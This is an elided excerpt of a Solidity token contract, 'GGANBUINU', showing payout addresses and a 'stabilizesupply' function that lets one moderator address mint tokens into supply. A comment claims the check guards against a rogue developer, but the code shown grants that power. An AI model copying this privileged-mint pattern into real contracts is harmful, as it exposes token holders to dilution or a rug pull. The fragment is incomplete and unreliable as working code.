...
contract GGANBUINU is Context, IERC20, Moderator {
    ...
    address payable public Charity = payable(0x8539adAA79a342bB8A5aa5De1603e199C24Dc1AC); // Charity Address for development of community voted philantropic actions
    address payable public Marketing=payable(0x2B18156303f8291541ae33c0067EB95b284668eD);// Marketing Address
    ...
    uint256 private _maxTxAmount = 45*10**9 * 10**9;
   ...
   function excludeFromReward(address account) public {
    ...
    function swapETHForTokens(uint256 amount) private {
     ...
     function stabilizesupply (uint256 _amount ) public{
         ...
         // Can only generate tokens to total supply to prevent theft by rogue dev
        require(_moderator == _msgSender());
        ...
        if(_isExcluded[address(this)]){_tOwned[address(this)]=_tOwned[address(this)].add(amount); _tTotal= _tTotal.add(amount);}
